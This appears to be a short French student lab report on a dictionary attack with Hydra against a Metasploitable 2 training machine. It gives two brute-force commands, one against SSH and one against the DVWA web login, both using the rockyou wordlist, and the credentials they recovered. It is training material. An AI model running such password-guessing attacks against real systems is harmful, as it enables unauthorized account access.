# TP 9: Attaque par dictionnaire avec Hydra
## Cible: Metaspoitable 2
## Commandes exécutées:
\hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.56.101
## Résultat obtenu:
Login:msfadmin/Password:msfadmin
## Résultat obtenu:
\hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.56.101 http-get /dvwa/
## Résultat obtenu:
Login:admin/Password:msfadmin
